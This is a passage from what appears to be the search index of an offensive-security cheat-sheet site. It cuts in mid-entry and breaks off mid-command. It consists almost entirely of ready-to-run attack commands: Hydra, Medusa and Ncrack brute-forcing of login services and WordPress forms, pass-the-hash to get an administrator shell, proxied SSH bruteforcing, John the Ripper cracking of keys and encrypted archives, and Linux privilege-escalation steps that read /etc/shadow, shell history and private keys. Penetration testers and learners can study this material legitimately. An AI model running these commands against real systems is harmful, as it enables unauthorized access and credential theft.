\"/Account/login.aspx:__VIEWSTATE=AmInWQjOL%2BAHMc9qQ0CW0CFnlUXaqoRXEj%2FOvBixV%2Fld9p%2BKj%2B7mB%2FZ7FcrOxWmCkIjSfD9utiaSxAvSBmKz1VkaDvYW9b5sxJWoX3ZOskfQg0u3CsSjndshwiuLcEq7l%2BRc7FwwBs%2BvLvrnXfcLFt%2B0vNv1zwwLa3QoTUjG3V9hk0Sg&amp;__EVENTVALIDATION=zMZzvwm4lfkTglvBFfLhbEjJu8yEheigLkmHJ7E8owtV2FVK0TTZdne0RExmMdPY5RORs4UuLmymoBfQmY8UwKaRwaqnpZkAM%2BPLgxPNj3wtiiTaC4jbJSUoKPCRWBtpMIz4vtdxr9zbhDPn5zB7IJSOpA%2FMzo6LYD9oiiaMKWUj8VNM&amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed\"\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#imap","title":"IMAP","text":"<pre><code>hydra -l root -P passwords.txt -f imap://10.0.2.5 -V\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#mysql","title":"MySQL","text":"<pre><code>hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#pop","title":"POP","text":"<pre><code>hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V\nhydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V    \n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#redis","title":"Redis","text":"<pre><code>hydra \u2013P password.txt redis://10.0.2.5 -V\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#rexec","title":"Rexec","text":"<pre><code>hydra -l root -P password.txt rexec://10.0.2.5 -V\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#rlogin","title":"Rlogin","text":"<pre><code>hydra -l root -P password.txt rlogin://10.0.2.5 -V\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#rsh","title":"RSH","text":"<pre><code>hydra -L username.txt rsh://10.0.2.5 -V\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#rsp","title":"RSP","text":"<pre><code>hydra -l root -P passwords.txt &lt;IP&gt; rtsp\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#snmp","title":"SNMP","text":"<pre><code>hydra -P password-file.txt -v $ip snmp\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#smtp","title":"SMTP","text":"<pre><code>hydra -l &lt;username&gt; -P /path/to/passwords.txt &lt;IP&gt; smtp -V\nhydra -P /usr/share/wordlistsnmap.lst $ip smtp -V\nhydra -l &lt;username&gt; -P /path/to/passwords.txt -s 587 &lt;IP&gt; -S -v -V\n#Port 587 for SMTP with SSL\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#telnet","title":"Telnet","text":"<pre><code>hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; telnet\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#vnc","title":"VNC","text":"<pre><code>hydra -L /root/Desktop/user.txt \u2013P /root/Desktop/pass.txt -s &lt;PORT&gt;\n&lt;IP&gt; vnc\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#wordpress","title":"Wordpress","text":"<pre><code>hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location'   \n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#ldap","title":"LDAP","text":"<pre><code>hydra -L users.txt -P passwords.txt $ip ldap2 -V -f \n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Medusa/","title":"Medusa","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Medusa/#medusa","title":"Medusa","text":"<pre><code>medusa -u root -P 500-worst-passwords.txt -h 10.10.10.10 -M ssh\nmedusa -h 10.10.10.10 -u root -P pass.txt -M ftp\nmedusa -H hosts.txt -U user.txt -P pass.txt -M ftp\nmedusa -H hosts.txt -U user.txt -P pass.txt -M ftp -T 1\nmedusa -H hosts.txt -U user.txt -P pass.txt -M ftp -T 2\nmedusa -h 10.10.10.10 -U user.txt -P pass.txt -M ssh\nmedusa -h 10.10.10.10 -U user.txt -P pass.txt -M ssh -n 2222\nmedusa -h 10.10.10.10 -U user.txt -P pass.txt -M ftp -O log.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Ncrack/","title":"Ncrack","text":"<pre><code>ncrack -p 22 --user root -P 500-worst-passwords.txt 10.10.10.10\nncrack -p ssh -u root -P 500-worst-passwords.txt -T5 10.10.10.10\nncrack -user msfadmin -P pass.txt 10.10.10.10:21\nncrack -U user.txt -pass msfadmin 10.10.10.10:21\nncrack -U user.txt -P pass.txt 10.10.10.10:21\nncrack -U user.txt -P pass.txt 10.10.10.10:21 -oN normal.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Passing_the_hash/","title":"Passing the hash","text":"<pre><code>#Authenticate by passing the hash as a password instead of cracking it.\n#Replace the NOPASSWORD from the hashes with an empty LM hash: **aad3b435b51404eeaad3b435b51404ee**\n\npth-(TAB to see Options)\n\n# Remove NO PASSWORD on the hashes with an NTLM Hash\nexport SMBHASH=...........HASH.................\n\n# Log on to the target\npth-winexe -U administrator% //10.10.10.10 cmd\n\n#OR (just run the following)\n# Log on to the target\npth-winexe -U administrator%hash //10.10.10.10 cmd\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/SSH_Brute_Force/","title":"SSH Brute Force","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/SSH_Brute_Force/#calc1f4r-ssh-bruteforcer","title":"calc1f4r SSH-Bruteforcer","text":"<p>calc1f4r - Async SSH Bruteforce &amp; Multi-threaded SSH bruteforcer</p>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/SSH_Brute_Force/#download-repo-install-requirements","title":"Download repo &amp; Install requirements","text":"<pre><code>git clone https://github.com/584F525F/SSH-Bruteforcer.git\ncd SSH-Bruteforcer/\npip install requirements.txt -r\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/SSH_Brute_Force/#choose-whether-you-want-to-use-the-async-or-multithread-python-script-and-run-the-one-you-need","title":"Choose whether you want to use the async or multithread Python script and run the one you need","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/SSH_Brute_Force/#async","title":"async","text":"<pre><code>usage: async-ssh-bruteforcer.py [-h] [-p PORT] -w WORDLIST -u USERNAME target\n\npositional arguments:\ntarget                Host to attack on e.g. 10.10.10.10.\n\noptions:\n-h, --help            show this help message and exit\n-p PORT, --port PORT  Port to attack on, Default:22\n-w WORDLIST, --wordlist WORDLIST\n-u USERNAME, --username USERNAME\n                        Username with which bruteforce to\n</code></pre> <p>Example</p> <pre><code>python3 async-ssh-bruteforcer.py -p &lt;port&gt; -u &lt;username&gt; -w &lt;wordlist&gt; &lt;target&gt;\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/SSH_Brute_Force/#multithreaded","title":"multithreaded","text":"<pre><code>usage: multithreaded-ssh-bruteforcer.py [-h] [-p PORT] -w WORDLIST -u USERNAME [-t THREADS] target\n\npositional arguments:\ntarget                Host to attack on e.g. 10.10.10.10.\n\noptions:\n-h, --help            show this help message and exit\n-p PORT, --port PORT  Port to attack on, Default:22\n-w WORDLIST, --wordlist WORDLIST\n-u USERNAME, --username USERNAME\n                        Username with which bruteforce to\n-t THREADS, --threads THREADS\n                        Specify the thread to use ,Default:4,supports 8 threads\n</code></pre> <p>Example</p> <pre><code>python3 multithreaded-ssh-bruteforcer.py -p &lt;port&gt; -u &lt;username&gt; -w &lt;wordlist&gt; -t &lt;threads_default_4_supports_upto_8&gt; &lt;target&gt;\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/SSH_Brute_Force/#k4yt3x-orbitaldump","title":"k4yt3x orbitaldump","text":"<p>k4yt3x orbitaldump</p> <p>You can install OrbitalDump through pip</p> <pre><code>pip install -U --user orbitaldump\norbitaldump\n</code></pre> <p>Alternatively, you can clone this repository and run the source code directly</p> <pre><code>git clone https://github.com/k4yt3x/orbitaldump.git\ncd orbitaldump\npython -m orbitaldump\n</code></pre> <p>Usages</p> <pre><code>A simple usage is shown below. This command below:\n    t 10: launch 10 brute-forcing threads\n    u usernames.txt: read usernames from usernames.txt (one username per line)\n    p passwords.txt: read passwords from passwords.txt (one password per line)\n    h example.com: set brute-forcing target to\u00a0example.commands \n    -proxies: launch attacks over proxies from ProxyScrape\n    python -m orbitaldump -t 2 -u usernames.txt -p passwords.txt -h example.com --proxies\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Wordlists/","title":"Wordlists","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Wordlists/#wordlists-references","title":"Wordlists references","text":"<ul> <li>Kaonashi</li> <li>weakpass</li> <li>gwicks dictionaries</li> <li>rockyou</li> </ul>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Wordlists/#seclist","title":"seclist","text":"<pre><code>sudo apt-get install seclists\nls /usr/share/wordlists\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Wordlists/#cewl","title":"CeWL","text":"<p>CeWL allows you to build custom wordlists based on online resources. If you know that your target is target.com, you can parse web content to build lists. Can be time consuming.</p> <pre><code># 5 levels of depth and minimum 7 char per word\ncewl -w customwordlist.txt -d 5 -m 7 www.sans.org\n\n# Also visit and parse other sites\ncewl -w customwordlist.txt -d 5 -m 7 -o www.sans.org\n\n# Include e-mail adresses\ncewl -w customwordlist.txt -d 5 -m 7 -e www.sans.org\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Wordlists/#pack","title":"PACK","text":"<p>Password Analysis and Cracking Kit. You can get stats about already cracked passwords, In order to define new masks https://github.com/iphelix/pack</p> <pre><code>python statsgen.py rockyou.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Wordlists/#combinator","title":"Combinator","text":"<p>Combinator is part of the hashcat-utils. It can be used to prepare a combinated wordlist for cracking. It allows then to combination + others settings like masks or rules.</p> <pre><code>combinator.exe file1 file2\n\n# It can create MASSIVE wordlists and take some time to run.\n\n# Three files combination\ncombinator2.exe file1 file2 file3\n\n# You can also feed output directly to hashcat\ncombinator.exe file1 file2 | hashcat -m x hashs.file -a 0 --force -O\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/","title":"Basic Usage","text":"<p>sources: Offensive Security Cheatsheet</p> <pre><code>john hashfile.txt\njohn --wordlist=/path/to/your/wordlist.txt hashfile.txt\njohn --format=ntlm hashfile.txt\njohn --format=bcrypt hashfile.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#ssh2john-decrypt-ssh-private-key","title":"ssh2john decrypt SSH private key","text":"<pre><code>ssh2john id_rsa &gt; crack.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt crack.txt\nopenssl rsa -in id_rsa\n#Enter pass phrase for id_rsa: PASSWORD_HERE\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#gpg2john-decrypted-pgp-file","title":"gpg2john - Decrypted PGP file","text":"<pre><code>gpg --import name.asc \ngpg2john name.asc &gt; hash\njohn --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash \ngpg --decrypt somecredentials.pgp # Enter the password found above. \n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#zip2john-decrypt-zip-files","title":"zip2john - Decrypt ZIP files","text":"<pre><code>zip2john somezipname.zip &gt; zipname.hash\njohn zipname.hash\n7z e somezipname.zip\n# Enter password (will not be echoed): PASSWORD_HERE\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#keepass2john","title":"keepass2john","text":"<pre><code>keepass2john some_pass_key.kdbx\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#rar2john","title":"rar2john","text":"<pre><code>rar2john SOME_FILE.rar &gt; crack_this\njohn --wordlist=/usr/share/wordlists/rockyou.txt crack_this\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#wordlist-mode-dictionnary-attack","title":"Wordlist Mode | Dictionnary attack","text":"<pre><code>./john --wordlist=password.lst hashfile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#dictionnary-attack-using-default-or-specific-rules","title":"Dictionnary attack using default or specific rules","text":"<pre><code>./john --wordlist=password.lst --rules=rulename hashFile\n./john --wordlist=password.lst --rules mypasswd\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#mangling-rules-mode-hybrid","title":"Mangling Rules Mode (hybrid)","text":"<pre><code>./john --wordlist=password.lst \u2013 rules: hashfile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#incremental-mode-brute-force","title":"Incremental mode (Brute Force)","text":"<pre><code>./john --incremental hashFile\n./john --incremental hashfile External mode (use a program to generate guesses) ./john --external: hashfile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#loopback-mode-use-pot-as-wordlist","title":"Loopback mode (use POT as wordlist)","text":"<pre><code>./john --loopback hashFile\n./john --loopback hashfile Mask mode (read MASK under /doc) ./john --mask=?1?1?1?1?1?1?1?1 -1=[A-Z] hashfile -min-len=8 \n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#hybrid-mask-mode","title":"Hybrid Mask mode","text":"<pre><code>./john -w=password.lst - mask='?l?l?w?l?l' hashfile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#mask-bruteforce-attack","title":"Mask bruteforce attack","text":"<pre><code>./john --mask=?1?1?1?1?1?1 --1=[A-Z] hashFile --min-len=8\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#dictionnary-attack-using-masks","title":"Dictionnary attack using masks","text":"<pre><code>./john --wordlist=password.lst -mask='?l?l?w?l' hashFile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#markov-mode-read-markov-under-doc","title":"Markov mode (Read MARKOV under /doc)","text":"<pre><code>---First-generate-Markov-stats:\n./calc_stat wordlist markovstats\n---Then-run:\n./john -markov:200 -max-len:12 hashfile --mkv-stats=markovstats\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#prince-mode-read-prince-under-doc","title":"Prince mode (Read PRINCE under /doc)","text":"<pre><code>./john --prince=wordlist hashfile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Basic_Usage/#most-modes-have-maxlen13-in-johnconf-but-it-can-be-overwritten-with","title":"Most modes have Maxlen=13 in John.conf but it can be overwritten with","text":"<pre><code>-max-len=N up to 24\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/","title":"Cracking modes","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/#wordlist-mode-dictionary-attack","title":"Wordlist Mode | Dictionary attack","text":"<pre><code>./john --wordlist=password.lst hashfile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/#dictionary-attack-using-default-or-specific-rules","title":"Dictionary attack using default or specific rules","text":"<pre><code>./john --wordlist=password.lst --rules=rulename hashFile\n./john --wordlist=password.lst --rules mypasswd\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/#mangling-rules-mode-hybrid","title":"Mangling Rules Mode (hybrid)","text":"<pre><code>./john --wordlist=password.lst \u2013 rules: hashfile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/#incremental-mode-brute-force","title":"Incremental mode (Brute Force)","text":"<pre><code>./john --incremental hashFile\n./john --incremental hashfile External mode (use a program to generate guesses) ./john --external: hashfile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/#loopback-mode-use-pot-as-wordlist","title":"Loopback mode (use POT as wordlist)","text":"<pre><code>./john --loopback hashFile\n./john --loopback hashfile Mask mode (read MASK under /doc) ./john --mask=?1?1?1?1?1?1?1?1 -1=[A-Z] hashfile -min-len=8 \n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/#hybrid-mask-mode","title":"Hybrid Mask mode","text":"<pre><code>./john -w=password.lst - mask='?l?l?w?l?l' hashfile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/#mask-bruteforce-attack","title":"Mask bruteforce attack","text":"<pre><code>./john --mask=?1?1?1?1?1?1 --1=[A-Z] hashFile --min-len=8\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/#dictionary-attack-using-masks","title":"Dictionary attack using masks","text":"<pre><code>./john --wordlist=password.lst -mask='?l?l?w?l' hashFile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/#markov-mode-read-markov-under-doc","title":"Markov mode (Read MARKOV under /doc)","text":"<pre><code>---First-generate-Markov-stats:\n./calc_stat wordlist markovstats\n---Then-run:\n./john -markov:200 -max-len:12 hashfile --mkv-stats=markovstats\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/#prince-mode-read-prince-under-doc","title":"Prince mode (Read PRINCE under /doc)","text":"<pre><code>./john --prince=wordlist hashfile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Cracking_modes/#most-modes-have-maxlen13-in-johnconf-but-it-can-be-overwritten-with","title":"Most modes have Maxlen=13 in John.conf but it can be overwritten with","text":"<pre><code>-max-len=N up to 24\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Misc_%26_Tricks/","title":"Misc & Tricks","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Misc_%26_Tricks/#show-hidden-options","title":"Show hidden options","text":"<pre><code>./john --list=hidden-options\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Misc_%26_Tricks/#using-session-and-restoring-them","title":"Using session and restoring them","text":"<pre><code>./john hashes --session=name\n./john --restore=name\n./john --session=allrules --wordlist=all.lst --rules mypasswd &amp;\n./john status\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Misc_%26_Tricks/#show-the-potfile","title":"Show the potfile","text":"<pre><code>./john hashes --pot=potFile --show\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Misc_%26_Tricks/#search-if-a-rootuid0-have-been-cracked","title":"Search if a root/uid0 have been cracked","text":"<pre><code>john --show --users=0 mypasswdFile\njohn --show --users=root mypasswdFile\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Misc_%26_Tricks/#list-opencl-devices-and-get-their-id","title":"List OpenCL devices and get their id","text":"<pre><code>./john --list=opencl-devices\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Misc_%26_Tricks/#list-format-supported-by-opencl","title":"List format supported by OpenCL","text":"<pre><code>./john --list=formats --format=opencl\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Misc_%26_Tricks/#using-multiples-gpu","title":"Using multiples GPU","text":"<pre><code>./john hashes --format:openclformat --wordlist:wordlist --rules:rules --dev=0,1 --fork=2\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Misc_%26_Tricks/#using-multiple-cpu-eg-4-cores","title":"Using multiple CPU (eg. 4 cores)","text":"<pre><code>./john hashes --wordlist:wordlist --rules:rules --dev=2 --fork=4\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Rules/","title":"Rules","text":"<pre><code># Predefined rules\n--rules:Single\n--rules:Wordlist\n--rules:Extra\n--rules:Jumbo # All the above\n--rules:KoreLogic\n--rules:All # All the above\n# Create a new rule in John.conf\n[List.Rules:Tryout]\nl\nu\n...\n| Rule          | Description                                               |\n|------------   |-------------------------------------------------------    |\n| l             | Convert to lowercase                                      |\n| u             | Convert to uppercase                                      |\n| c             | Capitalize                                                |\n| l r           | Lowercase the word and reverse it                         |\n| l Az\"2015\"    | Lowercase the word and append \"2015\" at the end           |\n| d             | Duplicate                                                 |\n| l A0\"2015\"    | Lowercase the word and append \"2015\" at the beginning     |\n| A0\"#\"Az\"#\"    | Add \"#\" at the beginning and the end of the word          |\n| C             |  Lowercase the first char and uppercase the rest          |\n| t             | Toggle case of all char                                   |\n| TN            | Toggle the case of the char in position N                 |\n| r             | Reverse the word                                          |\n| f             | Reflect (Fred --&gt; Fredderf)                               |\n| {             | Rotate the word left                                      |\n| }             | Rotate the word right                                     |\n| $x            | Append char X to the word                                 |\n| ^x            | Prefix the word with X char                               |\n| [             | Remove the first char from the word                       |\n| ]             | Remove the last char from the word                        |\n| DN            | Delete the char in position N                             |\n| xNM           | Extract substring from position N for M char              |\n| iNX           | Insert char X in position N and shift the rest right      |\n| oNX           | Overstrike char in position N with X                      |\n| S             | Shift case                                                |\n| V             | Lowercase vowels and uppercase consonants                 |\n| R             | Shift each char right on the keyboard                     |\n| L             | Shift each char left on the keyboard                      |\n| &lt;N            | Reject the word unless it is less than N char long        |\n| &gt;N            | Reject the word unless it is greater than N char long     |\n| \\'N           | Truncate the word at length N                             |\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Wordlists_%26_Incremental/","title":"Wordlists & Incremental","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Wordlists_%26_Incremental/#sort-a-wordlist-for-the-wordlist-mode","title":"Sort a wordlist for the wordlist mode","text":"<pre><code>tr A-Z a-z &lt; SOURCE | sort -u &gt; TARGET\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Wordlists_%26_Incremental/#use-a-potfile-to-generate-a-new-wordlist","title":"Use a potfile to generate a new wordlist","text":"<pre><code>cut -d ':' -f 2 john.pot | sort -u pot.dic\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Wordlists_%26_Incremental/#generate-candidate-password-for-slow-hashes","title":"Generate candidate password for slow hashes","text":"<pre><code>./john --wordlist=password.lst --stdout --rules:Jumbo | ./unique -mem=25 wordlist.uniq\n--incremental:Lower # 26 char\n--incremental:Alpha # 52 char\n--incremental:Digits # 10 char\n--incremental:Alnum # 62 char\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Wordlists_%26_Incremental/#create-a-new-charset","title":"Create a new charset","text":"<pre><code>./john --make-charset=charset.chr\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Wordlists_%26_Incremental/#then-set-the-following-in-the-johnconf","title":"Then set the following in the John.conf","text":"<p>Incremental modes <pre><code>[Incremental:charset]\nFile = $JOHN/charset.chr\nMinLen = 0\nMaxLen = 31\nCharCount = 95\n</code></pre></p>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/JohnTheRipper/Wordlists_%26_Incremental/#using-a-specific-charset","title":"Using a specific charset","text":"<pre><code>./john --incremental:charset hashFile\n</code></pre>"},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/","title":"Linux Privilege Escalation","text":""},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#common-checks","title":"common checks","text":""},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#kernal-check","title":"Kernal check","text":"<pre><code>#Kernal version\nuname -a\ncat /proc/version\ncat /etc/issue\n</code></pre>"},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#cpu","title":"CPU","text":"<pre><code>#Checking CPU Cores vs the resources an exploit might need to avoid running an exploit that exceeds CPU on system\n#Check ARCHETICTURE\nlscpu\n</code></pre>"},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#running-services","title":"Running Services","text":"<pre><code>#show running services - they are in order of execution, top is oldest and bottom is latest\nps aux\n\n#pull all services running by root\n#you canchange root to any username\nps aux | grep root\n</code></pre>"},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#writable-paths-suid-cap","title":"writable Paths | SUID | CAP","text":"<pre><code>#find writable paths\nfind / -writable 2&gt;/dev/null | grep home\n\n#SUID bit - denoted as s. \nfind / -type f -perm -04000 -ls 2&gt;/dev/null | awk '{print $3, $5, $6, $NF}' | grep /usr/bin/. \nfind / -type f -perm -04000 -ls 2&gt;/dev/null\n\n#get capabilities\ngetcap -r / 2&gt;/dev/null\n\n[GTFOBins](https://gtfobins.github.io/)\n</code></pre>"},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#privileges","title":"Privileges","text":"<pre><code>#see the user privileges\nid\n\n#what services can you run as root without needing a root password\nsudo -l\n\n#users\ncat /etc/passwd\ncat /etc/passwd | cut -d :  -f 1         #d for delimeter   #f for field   \n\n#passwords\ncat /etc/shadow\n\n#The group file\ncat /etc/group\n\n#escalate to another user or root user\nsudo su -\n</code></pre>"},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#misc","title":"misc","text":"<pre><code>#in a command line the single quotes take precedence\nping 8.8.8.8 | 'ls'   &gt;  will print ls\n\n#checking $PATH env variable\nprint $PATH\n\n#check command history\ncat ~/.bash_history | grep -i passw\n\n#check bash history\nls -la\ncat .bash_history \n</code></pre>"},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#looking-up-password","title":"looking up password","text":"<pre><code>#grep anything that contains the word password and color it red\ngrep --color=auto -rnw '/' -ie \"PASSWORD=\" --color=always 2&gt; /dev/null\n#find pasword named files\nlocate password | more\nlocate pass | more\nlocate pwd | more\nfind / -name authorized_keys 2&gt; /dev/null\nfind / -name id_rsa 2&gt; /dev/null\n</code></pre>"},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#crontab-cronjobs-process-explore","title":"Crontab Cronjobs | process explore","text":""},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#strace","title":"strace","text":"<pre><code>strace 